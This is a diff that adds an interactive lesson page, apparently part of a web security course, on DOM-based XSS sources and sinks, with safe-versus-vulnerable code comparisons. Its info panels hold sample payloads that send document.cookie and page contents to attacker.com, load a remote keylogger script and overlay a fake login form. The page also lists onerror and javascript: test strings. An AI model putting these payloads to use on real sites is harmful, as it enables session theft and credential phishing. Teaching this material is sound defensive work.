+  <input id="userInput" type="text"
+    value="<b>hello</b>"
+    style="width:100%; padding:0.5rem; margin-bottom:1rem;
+           font-family:monospace; font-size:0.9rem; border:1px solid #ccc">
+
+  <button onclick="writeInner()">innerHTML</button>
+  <button onclick="writeText()">textContent</button>
+  <button onclick="writeDoc()">document.write</button>
+  <button onclick="runEval()">eval()</button>
+
+  <hr style="margin:1rem 0">
+  <div id="output" style="min-height:40px; padding:0.5rem;
+       border:1px solid #ddd; background:#fff; border-radius:4px">
+    Output appears here
+  </div>
+
+  <script>
+    const get = id => document.getElementById(id);
+    function writeInner() {
+      get('output').innerHTML = get('userInput').value;
+    }
+    function writeText() {
+      get('output').textContent = get('userInput').value;
+    }
+    function writeDoc() {
+      document.write(get('userInput').value);
+    }
+    function runEval() {
+      try { eval(get('userInput').value); }
+      catch(e) { get('output').textContent = 'Error: ' + e.message; }
+    }
+  </script>
+
+</body>
+</html></textarea>
+        <iframe class="editor-preview" id="sandboxPrev" style="min-height:300px"
+          sandbox="allow-scripts allow-modals"></iframe>
+      </div>
+    </div>
+
+    <div class="callout warning">
+      <div class="callout-title">⚠️ What to try in the sandbox</div>
+      1. Click <strong>innerHTML</strong> with the default value — watch <code>&lt;b&gt;hello&lt;/b&gt;</code> render as bold text<br>
+      2. Click <strong>textContent</strong> — same input now shows as literal characters<br>
+      3. Change the input to <code>&lt;img src=x onerror=alert(1)&gt;</code> and click <strong>innerHTML</strong><br>
+      4. Try <code>alert('eval XSS')</code> and click <strong>eval()</strong> — observe that eval executes arbitrary code<br>
+      5. The goal: build intuition for <em>why</em> each sink behaves the way it does
+    </div>
+
+    <!-- BOTTOM NAV -->
+    <div class="bottom-nav">
+      <a class="btn-back" href="../modul-1/1-4-lab.html">← 1.4 Mini-Lab</a>
+      <a class="btn-next" href="2-2.html">Next: 2.2 Cookies, Sessions &amp; Hijacking →</a>
+    </div>
+
+  </div>
+
+
+  <script>
+
+    // ── Editors ──
+    const edDefaults = {};
+    window.addEventListener('load', () => {
+      ['domXssEd','sandboxEd'].forEach(id => {
+        edDefaults[id] = document.getElementById(id).value;
+      });
+      runEd('domXssEd','domXssPrev');
+      runEd('sandboxEd','sandboxPrev');
+      markVisited('2-1');
+    });
+
+    function runEd(codeId, prevId) {
+      document.getElementById(prevId).srcdoc = document.getElementById(codeId).value;
+    }
+    function resetEd(codeId, prevId) {
+      document.getElementById(codeId).value = edDefaults[codeId];
+      runEd(codeId, prevId);
+    }
+    function resizeEd(codeId, prevId, h) {
+      document.getElementById(codeId).style.minHeight = h + 'px';
+      document.getElementById(prevId).style.minHeight = h + 'px';
+    }
+
+    // ── innerHTML vs textContent demo ──
+    function runDanger() {
+      const val = document.getElementById('dangerInput').value;
+      document.getElementById('dangerResult').innerHTML = val;
+    }
+    function runSafe() {
+      const val = document.getElementById('safeInput').value;
+      document.getElementById('safeResult').textContent = val;
+    }
+    window.addEventListener('load', () => { runDanger(); runSafe(); });
+
+    // ── DOM Tree info ──
+    const domInfoData = {
+      window: {
+        title: 'window',
+        desc: 'The global object — the top of everything. Every JavaScript variable and function lives here by default. An XSS payload executing in the window context has access to cookies, localStorage, the full DOM, and the ability to make network requests.',
+        code: '// XSS payload with full window access\nwindow.location = "https://attacker.com?c=" + document.cookie;\n\n// Or silently exfiltrate data\nnew Image().src = "https://attacker.com/log?d=" + btoa(document.body.innerHTML);'
+      },
+      document: {
+        title: 'document',
+        desc: 'The entry point to the DOM. Through document, JavaScript can read every element, modify content, create new nodes, and access cookies. document.cookie is the #1 target in XSS attacks.',
+        code: '// Read all cookies (classic XSS payload)\nconsole.log(document.cookie);\n\n// Find all forms and log their inputs\ndocument.querySelectorAll("input").forEach(i => console.log(i.name, i.value));'
+      },
+      html: {
+        title: '<html>',
+        desc: 'Root element of the page. Rarely targeted directly, but the entire page content is accessible from here.',
+        code: '// Grab entire page source\nconst src = document.documentElement.outerHTML;'
+      },
+      head: {
+        title: '<head>',
+        desc: 'Contains metadata. An attacker can inject script tags here or modify the CSP meta tag if they have DOM write access.',
+        code: '// Inject a malicious script tag into head\nconst s = document.createElement("script");\ns.src = "https://attacker.com/keylogger.js";\ndocument.head.appendChild(s);'
+      },
+      body: {
+        title: '<body>',
+        desc: 'Everything the user sees. Most XSS payloads target the body — injecting content, overlaying fake login forms, or reading visible data.',
+        code: '// Overlay a fake login form\ndocument.body.innerHTML += `\n  <div style="position:fixed;top:0;left:0;width:100%;height:100%;\n    background:white;z-index:9999">\n    <form>... fake login ...</form>\n  </div>`;'
+      },
+      div: {
+        title: '<div id="output">',
+        desc: 'A container element. This is the most common XSS sink target — developers often write user data here using innerHTML. If you find innerHTML = userControlledValue anywhere in code, this is your target.',
+        code: '// Vulnerable\ndocument.getElementById("output").innerHTML = userInput;\n\n// Safe\ndocument.getElementById("output").textContent = userInput;'
+      },
+      input: {
+        title: '<input id="search"> — XSS SOURCE',
+        desc: '🚨 This is a DOM XSS SOURCE — the point where attacker-controlled data enters the JavaScript environment. The value property contains whatever the user typed. If this flows to an innerHTML sink without sanitization, DOM XSS is achieved.',
+        code: '// Source: attacker controls this\nconst query = document.getElementById("search").value;\n\n// Vulnerable flow: source → sink\ndocument.getElementById("output").innerHTML = query;\n// ^ This is DOM XSS'
+      },
+      script: {
+        title: '<script> — XSS SINK',
+        desc: '🚨 A script tag is the ultimate XSS sink. If an attacker can inject a script tag into the DOM — either directly via innerHTML or via a vulnerable framework — arbitrary JavaScript executes immediately.',
+        code: '// Injected via innerHTML — executes immediately\nelement.innerHTML = "<script>stealCookies()<\/script>";\n\n// Or dynamically created\nconst s = document.createElement("script");\ns.textContent = "alert(document.cookie)";\ndocument.body.appendChild(s);'
+      }
+    };
+
+    function showDomInfo(id) {
+      document.querySelectorAll('.dom-node').forEach(n => n.classList.remove('selected'));
+      event.currentTarget.classList.add('selected');
+      const d = domInfoData[id];
+      document.getElementById('domInfoPane').innerHTML = `
+        <h4>${d.title}</h4>
+        <p>${d.desc}</p>
+        <pre>${escHtml(d.code)}</pre>`;
+    }
+
+    // ── Sink Explorer ──
+    const sinkData = {
+      innerHTML: {
+        name: 'element.innerHTML', risk: 'high',
+        desc: 'Parses the assigned string as HTML and renders it — including script tags, event handlers, and any other executable HTML. The single most exploited DOM XSS sink in the web.',
+        code: '// ❌ Vulnerable\noutput.innerHTML = userInput;\n// If userInput = <img src=x onerror=alert(1)> → XSS\n\n// ✅ Fix\noutput.textContent = userInput;'
+      },
+      docwrite: {
+        name: 'document.write()', risk: 'high',
+        desc: 'Writes HTML directly to the document stream. Executes any script tags in the argument. Largely obsolete but still found in legacy code — and still dangerous.',
+        code: '// ❌ Vulnerable\ndocument.write("<h1>" + userInput + "</h1>");\n\n// ✅ Avoid entirely — use DOM methods instead'
+      },
+      outerHTML: {
+        name: 'element.outerHTML', risk: 'high',
+        desc: 'Like innerHTML, but replaces the entire element including the tag itself. Equally dangerous — any HTML in the value is parsed and executed.',
+        code: '// ❌ Vulnerable\nelement.outerHTML = userInput;\n\n// ✅ Fix — use textContent or createElement'
+      },
+      insertAdj: {
+        name: 'insertAdjacentHTML()', risk: 'high',
+        desc: 'Inserts HTML at a specified position relative to an element. Less well-known than innerHTML, so often missed in code reviews — but equally dangerous.',
+        code: '// ❌ Vulnerable\nelement.insertAdjacentHTML("beforeend", userInput);\n\n// ✅ Fix\nconst node = document.createTextNode(userInput);\nelement.appendChild(node);'
+      },
+      eval: {
+        name: 'eval()', risk: 'high',
+        desc: 'Executes a string as JavaScript code. If user input reaches eval(), the attacker has arbitrary code execution. Full stop. There is almost never a legitimate reason to use eval() with dynamic data.',
+        code: '// ❌ Catastrophically vulnerable\neval(userInput); // Full code execution\n\n// ✅ Never pass user input to eval()\n// Refactor your logic — there is always a better way'
+      },
+      settimeout: {
+        name: 'setTimeout(string)', risk: 'high',
+        desc: 'When called with a string argument (not a function), setTimeout evaluates it like eval(). Rarely noticed by developers who assume setTimeout is safe.',
+        code: '// ❌ Vulnerable — string argument\nsetTimeout(userInput, 1000);\n\n// ✅ Safe — function argument\nsetTimeout(() => doSomething(), 1000);'
+      },
+      href: {
+        name: 'element.href', risk: 'medium',
+        desc: 'Setting href to a javascript: URI causes code to execute when the link is clicked. Less immediate than innerHTML but still a valid XSS vector.',
+        code: '// ❌ Vulnerable\nlink.href = userInput;\n// If userInput = javascript:alert(1) → XSS on click\n\n// ✅ Fix — validate URL scheme\nconst url = new URL(userInput);\nif (url.protocol === "https:") link.href = userInput;'
+      },
+      srcsink: {
+        name: 'iframe.src / script.src', risk: 'medium',
+        desc: 'Setting the src of a script or iframe to an attacker-controlled URL loads and executes external code or embeds an external page. Used for resource loading attacks.',
+        code: '// ❌ Vulnerable\nscript.src = userInput; // Loads attacker JS\niframe.src = userInput; // Embeds attacker page\n\n// ✅ Fix — whitelist allowed origins\nif (trustedOrigins.includes(new URL(userInput).origin))\n  script.src = userInput;'
+      },
+      textContent: {
+        name: 'textContent ✅', risk: 'low',
+        desc: 'Always safe. Treats the value as plain text — never parses HTML. The browser displays angle brackets literally as characters, not as tag delimiters. Use this whenever you need to display user-generated content.',
+        code: '// ✅ Always safe — use this by default\nelement.textContent = userInput;\n\n// Even this payload is completely harmless:\n// <script>alert(document.cookie)</script>\n// → displayed as literal text, never executed'
+      },
+      innerText: {
+        name: 'innerText ✅', risk: 'low',
+        desc: 'Similar to textContent — treats value as plain text. The difference is innerText is CSS-aware (it respects display:none and returns rendered text). Both are safe for displaying user input.',
+        code: '// ✅ Safe\nelement.innerText = userInput;\n\n// Slightly different from textContent:\n// innerText  → respects CSS visibility, triggers reflow\n// textContent → raw text, faster, no layout impact'
+      }
+    };
+
+    function escHtml(s) {
+      return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    function showSink(el, id) {
+      document.querySelectorAll('.sink-chip').forEach(c => c.classList.remove('active'));
+      el.classList.add('active');
+      const d = sinkData[id];
+      const riskLabel = d.risk === 'high' ? 'High Risk' : d.risk === 'medium' ? 'Medium Risk' : 'Safe';
+      const rbClass   = d.risk === 'high' ? 'rb-high'  : d.risk === 'medium' ? 'rb-med'     : 'rb-low';
+      const detail = document.getElementById('sinkDetail');
+      detail.innerHTML = `
+        <h4>${escHtml(d.name)} <span class="risk-badge ${rbClass}">${riskLabel}</span></h4>
+        <p>${d.desc}</p>
+        <pre>${escHtml(d.code)}</pre>`;
+      detail.classList.add('show');
+    }
+
+    function markVisited(id) {
+      let v = JSON.parse(localStorage.getItem('wsec_visited') || '[]');
+      if (!v.includes(id)) { v.push(id); localStorage.setItem('wsec_visited', JSON.stringify(v)); }
+    }
+
+  </script>
+</body>
+</html>
